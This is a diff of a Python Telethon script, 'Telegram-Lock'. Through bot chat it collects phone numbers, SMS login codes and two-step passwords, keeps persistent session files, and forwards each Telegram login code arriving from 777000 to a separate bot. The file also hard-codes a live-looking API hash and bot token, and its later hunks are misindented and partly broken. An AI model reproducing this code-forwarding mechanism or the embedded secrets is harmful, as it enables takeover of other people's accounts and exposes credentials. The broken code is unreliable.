@@ -19,220 +19,212 @@ logging.getLogger('httpx').setLevel(logging.WARNING)
 logging.getLogger('apscheduler').setLevel(logging.WARNING)
 logging.getLogger('telegram').setLevel(logging.WARNING)
 
-# API Credentials
+# API Config
 API_ID = 19684564
 API_HASH = "6219dccd88035a229ec3aa84d8162a38"
 BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
-# Target Bot Numeric ID (integer format)
 TARGET_BOT_ID = 8754918048
 
-# Global storage
+# Global cache
 accounts = {}
 user_login_states = {}
-PHONE_PATTERN = re.compile(r'^\+\d{10,15}$')
+PHONE_RULE = re.compile(r'^\+\d{10,15}$')
 
 
 def bind_account_handlers(client, phone):
     target_entity = None
-    # Force reload bot entity with 3 retry attempts
-    async def load_bot_entity():
+
+    async def load_bot_target():
         nonlocal target_entity
-        retry_times = 0
-        while retry_times < 3:
+        retry = 0
+        while retry < 3:
             try:
                 target_entity = await client.get_entity(TARGET_BOT_ID)
-                logger.info(f"[{phone}] Bot entity loaded successfully, ID = {target_entity.id}")
+                logger.info(f"[{phone}] Bot entity loaded, id={target_entity.id}")
                 break
-            except Exception as err:
-                retry_times += 1
-                logger.warning(f"[{phone}] Failed load bot, retry {retry_times}/3 | Error: {str(err)}")
+            except Exception as e:
+                retry += 1
+                logger.warning(f"[{phone}] Load bot failed, retry {retry}/3: {str(e)}")
                 await asyncio.sleep(2)
 
-    # Run load task after account login
-    client.loop.create_task(load_bot_entity())
+    client.loop.create_task(load_bot_target())
 
-    # Self check alive command
     @client.on(events.NewMessage(outgoing=True))
-    async def self_check_handler(event):
+    async def alive_test(event):
         if event.message.text and event.message.text.lower() == "self check":
-            await event.message.edit(text="self checked!")
+            await event.edit(text="self checked!")
 
-    # Query anti-login switch status
     @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
-    async def status_check(event):
-        state = "on" if accounts[phone]["anti_login"] else "off"
-        await event.message.edit(text=f"Anti-login forwarding switch status: {state}.")
-        logger.info(f"[{phone}] User query push status: {state}")
+    async def query_status(event):
+        stat = "on" if accounts[phone]["anti_login"] else "off"
+        await event.edit(text=f"Anti-login push status: {stat}")
+        logger.info(f"[{phone}] Query push switch: {stat}")
 
-    # Enable auto send verification text
     @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
     async def enable_push(event):
         accounts[phone]["anti_login"] = True
-        await event.message.edit(text="Anti-login text push enabled successfully.")
-        logger.info(f"[{phone}] Auto verification push turned ON")
+        await event.edit(text="Auto verification push enabled.")
+        logger.info(f"[{phone}] Push switch turned ON")
 
-    # Disable auto send verification text
     @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
     async def disable_push(event):
         accounts[phone]["anti_login"] = False
-        await event.message.edit(text="Anti-login text push disabled successfully.")
-        logger.info(f"[{phone}] Auto verification push turned OFF")
+        await event.edit(text="Auto verification push disabled.")
+        logger.info(f"[{phone}] Push switch turned OFF")
 
-    # Capture SMS message from official Telegram bot 777000
     @client.on(events.NewMessage(from_users=[777000]))
-    async def capture_verification(event):
-        logger.info(f"[{phone}] Received login SMS from 777000, push switch = {accounts[phone]['anti_login']}")
+    async def capture_code(event):
+        logger.info(f"[{phone}] Received SMS from 777000, push={accounts[phone]['anti_login']}")
         if accounts[phone]["anti_login"] and target_entity is not None:
             try:
-                message_text = f"Source Phone Number: {phone}\nVerification Content:\n{event.message.text}"
-                # Send plain text instead of forward message, higher compatibility
-                await client.send_message(target_entity, message_text)
-                logger.info(f"[{phone}] SUCCESS: Verification text sent to target bot {TARGET_BOT_ID}")
+                msg = f"Source Phone: {phone}\nCode Content:\n{event.message.text}"
+                await client.send_message(target_entity, msg)
+                logger.info(f"[{phone}] SUCCESS: Code sent to bot {TARGET_BOT_ID}")
             except Exception as err:
-                logger.error(f"[{phone}] FAILED send verification text: {str(err)}")
+                logger.error(f"[{phone}] Send failed: {str(err)}")
 
 
-# Main management bot client for account control commands
+# Management Bot Instance
 bot_client = TelegramClient(StringSession(), API_ID, API_HASH)
 
 
 @bot_client.on(events.NewMessage(pattern="/start"))
-async def cmd_help(event):
-    help_text = """📖 Telegram-Lock Full Command List
-[Commands run inside your logged phone chat window]
-self check        Test if program is running normally
-antilogin         Check auto-verification text push switch status
-antilogin on      Enable auto send login SMS text to target bot
-antilogin off     Disable auto send login SMS text
+async def help_menu(event):
+    text = """📖 Telegram-Lock Command List
+[Phone Chat Commands]
+self check        Check program alive
+antilogin         Check push switch status
+antilogin on      Enable auto send SMS to bot
+antilogin off     Disable auto send SMS
 
-[Management Commands (Send to this bot private chat)]
-/addphone +8613800138000    Login new phone number to monitor SMS
-/listphone                  Show all logged phone numbers & push status
-/delphone +8613800138000    Delete local session file of target phone
-/logout +8613800138000      Remote logout target phone on all devices
+[Bot Private Commands]
+/addphone +8613800138000    Login new monitor phone
+/listphone                  List all logged phones
+/delphone +8613800138000    Delete phone session
+/logout +8613800138000      Remote logout phone
 """
-    await event.reply(help_text)
+    await event.reply(text)
 
 
 @bot_client.on(events.NewMessage(pattern="/addphone (.+)"))
-async def cmd_add_new_phone(event):
-    input_phone = event.pattern_match.group(1).strip()
-    if not PHONE_PATTERN.match(input_phone):
-        await event.reply("❌ Wrong phone format, example: /addphone +8613800138000")
+async def add_phone(event):
+    phone = event.pattern_match.group(1).strip()
+    if not PHONE_RULE.match(phone):
+        await event.reply("❌ Invalid format, example: /addphone +8613800138000")
         return
-    if input_phone in accounts:
-        await event.reply("⚠️ This phone number has already logged in")
+    if phone in accounts:
+        await event.reply("⚠️ This phone already logged in")
         return
 
-    session_file_name = f"session_{input_phone.replace('+','')}"
-    new_user_client = TelegramClient(session_file_name, API_ID, API_HASH)
+    session_name = f"session_{phone.replace('+','')}"
+    new_client = TelegramClient(session_name, API_ID, API_HASH)
     try:
-        await new_user_client.connect()
-        code_request = await new_user_client.send_code_request(input_phone)
+        await new_client.connect()
+        code_req = await new_client.send_code_request(phone)
         user_login_states[event.sender_id] = {
-            "client": new_user_client,
-            "phone": input_phone,
-            "code_hash": code_request.phone_code_hash,
+            "client": new_client,
+            "phone": phone,
+            "code_hash": code_req.phone_code_hash,
             "step": "input_sms_code"
         }
-        await event.reply(f"✅ Login verification code sent to {input_phone}, reply pure numeric code to finish login")
+        await event.reply(f"✅ Code sent to {phone}, reply numeric code to login")
     except PhoneNumberInvalidError:
-        await event.reply("❌ Invalid phone number input")
+        await event.reply("❌ Wrong phone number")
     except AuthKeyDuplicatedError:
-        await event.reply("❌ This account is logged in on another device")
-    except Exception as err:
-        await event.reply(f"❌ Failed send login code: {str(err)}")
+        await event.reply("❌ Account logged on other device")
+    except Exception as e:
+        await event.reply(f"❌ Send code error: {str(e)}")
 
 
 @bot_client.on(events.NewMessage)
-async def login_input_process(event):
+async def login_process(event):
     if event.sender_id not in user_login_states:
         return
-    login_state = user_login_states[event.sender_id]
-    user_input = event.text.strip()
+    state = user_login_states[event.sender_id]
+    input_text = event.text.strip()
 
-    # Step 1: Input SMS login code
-    if login_state["step"] == "input_sms_code":
-        if not user_input.isdigit():
+    if state["step"] == "input_sms_code":
+        if not input_text.isdigit():
             return
         try:
-            await login_state["client"].sign_in(
-                phone_code_hash=login_state["code_hash"],
-                code=user_input
+            await state["client"].sign_in(
+                phone_code_hash=state["code_hash"],
+                code=input_text
             )
-            accounts[login_state["phone"]] = {
-                "client": login_state["client"],
+            accounts[state["phone"]] = {
+                "client": state["client"],
                 "anti_login": False
             }
-            bind_account_handlers(login_state["client"], login_state["phone"])
+            bind_account_handlers(state["client"], state["phone"])
             del user_login_states[event.sender_id]
-            await event.reply(f"🎉 {login_state['phone']} login complete, send antilogin on to enable auto code push")
+            await event.reply(f"🎉 {state['phone']} login done, send antilogin on to push code")
         except SessionPasswordNeededError:
-            login_state["step"] = "input_2fa_password"
-             await event.reply("🔐 This account enabled two-step verification, reply your 2FA password")
-         except PhoneCodeInvalidError:
-             await event.reply("❌ Incorrect SMS code, run /addphone to restart login")
-             del user_login_states[event.sender_id]
-         except Exception as err:
-             await event.reply(f"❌ Login failed: {str(err)}")
-             del user_login_states[event.sender_id]
-     # Step 2: Input two-factor verification password
-     elif login_state["step"] == "input_2fa_password":
-         try:
-             await login_state["client"].sign_in(password=user_input)
-             accounts[login_state["phone"]] = {
-                 "client": login_state["client"],
-                 "anti_login": False
-             }
-             bind_account_handlers(login_state["client"], login_state["phone"])
-             del user_login_states[event.sender_id]
-             await event.reply(f"🎉 {login_state['phone']} 2FA verified, login finished successfully")
-         except Exception as err:
-             await event.reply(f"❌ Wrong 2FA password or error: {str(err)}\nUse /addphone to restart login process")
-             del user_login_states[event.sender_id]
- @bot_client.on(events.NewMessage(pattern="/listphone"))
- async def cmd_list_all_logged(event):
-     if not accounts:
-         await event.reply("📭 No logged monitoring phones, use /addphone to add new account")
+            state["step"] = "input_2fa_password"
+            await event.reply("🔐 This account has 2FA enabled, reply your two-step password")
+        except PhoneCodeInvalidError:
+            await event.reply("❌ Incorrect SMS code, use /addphone to retry")
+            del user_login_states[event.sender_id]
+        except Exception as e:
+            await event.reply(f"❌ Login failed: {str(e)}")
+            del user_login_states[event.sender_id]
+
+    elif state["step"] == "input_2fa_password":
+        try:
+            await state["client"].sign_in(password=input_text)
+            accounts[state["phone"]] = {
+                "client": state["client"],
+                "anti_login": False
+            }
+            bind_account_handlers(state["client"], state["phone"])
+            del user_login_states[event.sender_id]
+            await event.reply(f"🎉 {state['phone']} 2FA verified, login complete")
+        except Exception as e:
+            await event.reply(f"❌ Wrong 2FA password, restart login with /addphone")
+            del user_login_states[event.sender_id]
+
+
+@bot_client.on(events.NewMessage(pattern="/listphone"))
+async def list_all(event):
+    if not accounts:
+        await event.reply("📭 No logged monitor phones, use /addphone")
          return
-     result_text = "📋 All Logged Monitoring Accounts:\n"
-     for phone_num, data in accounts.items():
-         push_status = "🟢 Push Enabled" if data["anti_login"] else "🔴 Push Disabled"
-         result_text += f"- {phone_num} | {push_status}\n"
-     await event.reply(result_text)
+     output = "📋 Logged Phone List:\n"
+     for num, data in accounts.items():
+         status = "🟢 Push ON" if data["anti_login"] else "🔴 Push OFF"
+         output += f"- {num} | {status}\n"
+     await event.reply(output)
  @bot_client.on(events.NewMessage(pattern="/delphone (.+)"))
- async def cmd_delete_phone_session(event):
-     target_phone = event.pattern_match.group(1).strip()
-     if target_phone not in accounts:
-         await event.reply("❌ Target phone number not found in logged list")
+ async def delete_session(event):
+     phone = event.pattern_match.group(1).strip()
+     if phone not in accounts:
+         await event.reply("❌ Phone number not found")
          return
-     await accounts[target_phone]["client"].disconnect()
-     del accounts[target_phone]
-     session_path = f"session_{target_phone.replace('+','')}.session"
-     if os.path.exists(session_path):
-         os.remove(session_path)
-     await event.reply(f"🗑 Session file of {target_phone} deleted completely")
+     await accounts[phone]["client"].disconnect()
+     del accounts[phone]
+     session_file = f"session_{phone.replace('+','')}.session"
+     if os.path.exists(session_file):
+         os.remove(session_file)
+     await event.reply(f"🗑 Session of {phone} removed")
  @bot_client.on(events.NewMessage(pattern="/logout (.+)"))
- async def cmd_remote_logout(event):
-     target_phone = event.pattern_match.group(1).strip()
-     if target_phone not in accounts:
-         await event.reply("❌ Target phone number not found in logged list")
+ async def remote_logout(event):
+     phone = event.pattern_match.group(1).strip()
+     if phone not in accounts:
+         await event.reply("❌ Phone number not found")
          return
      try:
-         await accounts[target_phone]["client"].log_out()
-         await accounts[target_phone]["client"].disconnect()
-         del accounts[target_phone]
-         session_path = f"session_{target_phone.replace('+','')}.session"
-         if os.path.exists(session_path):
-             os.remove(session_path)
-         await event.reply(f"🚪 {target_phone} logged out remotely from all Telegram devices")
-     except Exception as err:
-         await event.reply(f"❌ Remote logout failed: {str(err)}")
+         await accounts[phone]["client"].log_out()
+         await accounts[phone]["client"].disconnect()
+         del accounts[phone]
+         session_file = f"session_{phone.replace('+','')}.session"
+         if os.path.exists(session_file):
+             os.remove(session_file)
+         await event.reply(f"🚪 {phone} logged out remotely from all devices")
+     except Exception as e:
+         await event.reply(f"❌ Remote logout error: {str(e)}")
  async def main():
-     print("🤖 Telegram-Lock Program Started, waiting user commands...")
+     print("🤖 Telegram-Lock Started, waiting commands...")
      await bot_client.start(bot_token=BOT_TOKEN)
-     print("✅ Management Bot Online, send /start to view full command list")
-     # Permanent idle loop to keep program running
+     print("✅ Management Bot Online, send /start for command list")
      while True:
          await asyncio.sleep(1 / 60)
  if platform.system() == "Emscripten":
